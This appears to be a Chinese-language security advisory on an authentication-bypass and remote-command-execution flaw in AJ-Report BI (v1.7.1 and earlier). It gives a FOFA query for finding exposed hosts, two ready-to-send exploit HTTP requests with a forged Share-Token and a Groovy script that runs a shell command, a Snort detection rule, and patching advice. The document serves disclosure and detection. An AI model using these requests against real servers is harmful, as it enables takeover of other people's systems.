# AJ-ReportBI平台存在Nashorn JS引擎命令执行

AJ-ReportBI平台存在Nashorn JS引擎命令执行，攻击者可执行任意命令导致服务器被控。

# 影响版本

AJ-Report<=v1.7.1

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="AJ-Report"

POC/EXP：

```
POST /dataSet HTTP/1.1
Host: 192.168.1.14:9095
Share-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyZXBvcnRDb2RlIjoiIiwic2hhcmVDb2RlIjoieCJ9.-gbPZslLSlbE1GYp_k-DFjEkwwaiRVgcoxXPX3uqAsQ
Content-Type: application/json

{"setCode":"pwn3q","setName":"audit_pwn3","setDesc":"auth test","setType":"http","sourceCode":null,"dynSentence":"{\"apiUrl\":\"http://127.0.0.1:9095/gaeaDict/all\",\"method\":\"GET\",\"header\":\"{}\",\"body\":\"\"}","dataSetParamDtoList":[],"dataSetTransformDtoList":[{"transformType":"javaBean","transformScript":"import com.anjiplus.template.gaea.business.modules.datasettransform.service.IGroovyHandler\nimport com.alibaba.fastjson.JSONObject\nclass Pwn implements IGroovyHandler {\n  def out\n  Pwn(){ out = ['bash','-c','id; echo ZEROCRED_RCE_OK'].execute().text }\n  List<JSONObject> transform(List<JSONObject> data){ def jo = new JSONObject(); jo.put('pwn', out); return [jo] }\n}"}]}
```

```
POST /reportDashboard/getData HTTP/1.1
Host: 192.168.1.14:9095
Share-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyZXBvcnRDb2RlIjoiIiwic2hhcmVDb2RlIjoieCJ9.-gbPZslLSlbE1GYp_k-DFjEkwwaiRVgcoxXPX3uqAsQ
Content-Type: application/json

{"setCode":"pwn3q","contextData":{}}
```

![image-20260913112550250](assets/image-20260913112550250.png)

![image-20260913112600977](assets/image-20260913112600977.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"AJ-Report BI - /reportDashboard/getData Nashorn JS引擎命令执行 (Share-Token越权)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/reportDashboard/getData";
        fast_pattern;
    http.header_names;
        content:"share-token";
    http.content_type; content:"application/json";
    http.request_body;
        content:"setCode"; nocase;
        content:"contextData"; nocase; distance:0;
    metadata:
        service http,
        affected_product "anji-plus AJ-Report",
        vulnerability_type "Nashorn JS Engine RCE / Share-Token Auth Bypass",
        severity "critical";
    classtype:web-application-attack;
    sid:1000736;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
